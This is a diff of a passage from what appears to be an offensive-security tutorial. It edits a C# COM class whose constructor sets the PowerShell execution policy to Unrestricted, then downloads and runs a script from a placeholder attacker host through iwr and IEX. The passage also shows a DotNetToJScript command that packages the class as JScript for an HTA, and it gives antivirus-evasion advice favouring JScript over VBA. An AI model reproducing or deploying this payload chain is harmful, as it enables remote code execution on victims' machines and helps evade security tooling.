@@ -25,25 +25,20 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading.Tasks;
     
-namespace PshScriptExecLibrary
-{
+namespace PshScriptExecLibrary {
   [ComVisible(true)]
-       public class RunScriptClass
-       {
-           public RunScriptClass()
-           {
+       public class RunScriptClass {
+           public RunScriptClass() {
                // By default, ExecutionPolicy is Restricted, let's change that
                Runspace r = RunspaceFactory.CreateRunspace();
                r.Open();
                RunspaceInvoke s = new RunspaceInvoke(r);
                s.Invoke("Set-ExecutionPolicy Unrestricted -Scope CurrentUser");
                s.Invoke("(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://<IP_of_attacker>/<path_to_script>.ps1')|IEX");
-    
-        r.Close();
+               r.Close();
            }
     
-           public void RunProcess(string path)
-           {
+           public void RunProcess(string path) {
                Process.Start(path);
            }
      }
@@ -54,12 +49,18 @@ Then, you use DotNetToJscript to construct the VBS/JSript file.
 
 `DotNetToJScript.exe PshScriptExecLibrary.dll -v auto -c PshScriptExecLibrary.RunScriptClass -l jscript -o scriptExec.js`
 
-(sometimes the AV detects the JSript, sometimes it doesn't. I think that obfuscating the javascript code makes it undetected. But VBA is flagged)
+(Pick JScript instead of VBA, VBA is always flagged for some reason)
 
 Parameters :
-\-v auto is to specify to the program that the assembly targets higher versions (powershell libraries are not available for assemblies in the default version (v2))  
-\-c is used to specify the class (in this case PshScriptExecLibrary.RunScriptClass), by default DotNetToJScript uses its TestClass so that's why you have to specify which class to use  
+
+\-v auto is to specify to the program that the assembly targets higher versions (powershell libraries are not available for assemblies in the default version (v2))
+
+\-c is used to specify the class (in this case PshScriptExecLibrary.RunScriptClass).
+
+By default DotNetToJScript uses its TestClass so that's why you have to specify which class to use  
+
 \-l is used to specify the type of script we want to generate, here JScript  
+
 \-o is the path/name to/of the output file
 
 Then we create our HTA containing the generated JS code:
